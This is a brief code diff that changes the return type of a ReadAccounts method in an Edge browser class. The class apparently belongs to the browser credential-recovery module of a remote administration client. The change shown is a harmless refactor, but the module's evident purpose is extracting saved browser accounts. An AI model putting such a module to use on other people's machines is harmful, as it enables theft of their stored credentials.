@@ -11,7 +11,7 @@ namespace RemoteAdmin.Client.Recovery.Browsers
         public override string ApplicationName => "Microsoft Edge";
 
         /// <inheritdoc />
-        public override IEnumerable<RecoveredAccount> ReadAccounts()
+        public override List<RecoveredAccount> ReadAccounts()
         {
             try
             {
